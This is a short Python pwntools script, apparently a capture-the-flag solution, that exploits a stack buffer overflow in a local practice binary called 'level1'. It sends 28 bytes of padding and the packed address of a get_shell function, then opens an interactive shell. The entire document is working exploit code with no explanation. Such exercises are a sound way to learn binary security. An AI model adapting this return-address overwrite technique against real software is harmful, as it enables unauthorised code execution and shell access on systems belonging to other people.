from pwn import*
p = process('./level1')
junc = 'a' * 28
get_shell = 0x080484CB
payload = junc + p32(get_shell)
p.recvuntil('Can you getshell?\n')
p.send(payload)
p.interactive()
